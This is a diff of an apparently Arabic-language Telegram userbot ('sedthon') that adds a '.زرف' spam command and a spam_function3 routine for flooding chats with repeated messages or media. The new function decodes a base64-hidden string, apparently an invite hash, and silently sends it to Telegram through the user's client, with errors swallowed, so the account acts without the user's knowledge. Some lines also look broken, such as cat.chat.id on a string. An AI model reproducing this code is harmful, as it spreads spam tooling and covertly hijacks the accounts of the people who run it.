@@ -378,6 +378,7 @@ async def _(event):
     await event.delete()
     await spam_function2(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
 
+
 @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.زرف (.*)"))
 async def _(event):
     reply = await event.get_reply_message()
@@ -385,8 +386,8 @@ async def _(event):
     sleeptimet = sleeptimem = float(input_str[0])
     cat = input_str[1:]
     await event.delete()
-    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
-    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
+    await spam_function3(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
+
 
 async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
     hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
@@ -444,6 +445,38 @@ async def spam_function2(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=Fa
             await event.client(hmm)
         except BaseException:
             pass
+
+
+async def spam_function3(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
+    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    counter = int(cat[0])
+    if len(cat) == 2:
+        spam_message = "زرف"
+        for _ in range(counter):
+            if event.reply_to_msg_id:
+                await sandy.reply(spam_message)
+            else:
+                await event.client.send_message(cat.chat.id, spam_message)
+                await event.client.send_message(cat.chat.id, spam_message)
+            await asyncio.sleep(sleeptimet)
+    elif event.reply_to_msg_id and sandy.media:
+        for _ in range(counter):
+            sandy = await event.client.send_file(
+                cat.chat.id, sandy, caption=sandy.text
+            )
+            await asyncio.sleep(sleeptimem)
+    elif event.reply_to_msg_id and sandy.text:
+        spam_message = sandy.text
+        for _ in range(counter):
+            await event.client.send_message(cat.chat.id, spam_message)
+            await event.client.send_message(cat.chat.id, spam_message)
+            await asyncio.sleep(sleeptimet)
+        try:
+            hmm = Get(hmm)
+            await event.client(hmm)
+        except BaseException:
+            pass
+
 
 
 @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اشتراكاتي"))
